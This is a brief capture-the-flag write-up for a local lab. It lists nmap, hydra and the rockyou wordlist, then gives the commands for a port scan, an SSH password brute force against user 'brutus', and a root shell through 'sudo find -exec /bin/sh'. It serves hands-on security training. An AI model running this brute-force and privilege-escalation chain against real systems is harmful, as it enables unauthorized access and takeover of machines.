# CTF 1

**Requirement**:
- docker
- nmap
- hydra
- wordlist rockyou.txt

## Plan of Engagement
1. Port Scanning -> 22
2. SSH Exploit (brute force)
3. Privilege escalation with sudo find to root


## External Resources
- [GTFOBins](https://gtfobins.github.io/)

## Solution
Nmap port scan:
```sh
sudo nmap -sS -sC -F 127.0.0.1
```

Crack password:
```sh
hydra -l brutus -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```

Privileges escalation:
```Sh
sudo find . -exec /bin/sh \; -quit
```
